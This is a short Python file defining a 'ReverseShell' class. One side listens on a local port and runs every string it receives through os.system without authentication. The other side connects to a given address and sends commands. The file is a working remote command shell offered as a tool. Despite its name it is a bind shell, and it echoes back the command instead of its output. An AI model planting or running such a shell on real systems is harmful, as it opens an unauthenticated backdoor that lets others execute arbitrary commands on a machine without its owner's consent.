import socket
import os

# A class used to send commands to a remote machine
class ReverseShell:

	# Creates a new reverse shell instance.
	def __init__(self):
		# Creates a socket.
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# Used with a context manager.
	def __enter__(self):
		# Returns the class object.
		return self

	# Safely deletes the reverse shell instance.
	def __exit__(self, exc_type, exc_value, traceback):
		# Closes the socket.
		self.s.close()

	# Binds a shell to the specified port
	def bind(self, port=55555):
		# Binds the shell to the port and local address.
		self.s.bind(('127.0.0.1', port))
		# Waits for 1 connection.
		self.s.listen(1)
		# Accepts a connection.
		conn, addr = self.s.accept()
		# Safely uses the connection object.
		with conn:
			# Enters the message loop.
			while True:
				# Recieves the command.
				command = conn.recv(1024).decode('utf-8')
				# If the command doesn't exist then we stop the loop.
				if not command: break
				# Checks the command
				if command == 'getcwd':
					# Returns the current working directory
					conn.send(os.getcwd().encode('utf-8'))
				else:
					# Executes the command
					os.system(command)
					# Sends the result.
					conn.send(command.encode('utf-8'))

	# Connects to the given machine.
	def connect(self, address, port=55555):
		# Attempts to connect to the machine.
		self.s.connect((address, port))

	# Sends a command to the machine.
	def system(self, command):
		# Sends the command
		self.s.send(command.encode('utf-8'))
		# Recieves and returns the result.
		return self.s.recv(1024).decode('utf-8')

	# Returns the reverse shell current directory as a string.
	def getcwd(self):
		# Sends the getcwd command to the machine.
		return self.system('getcwd')
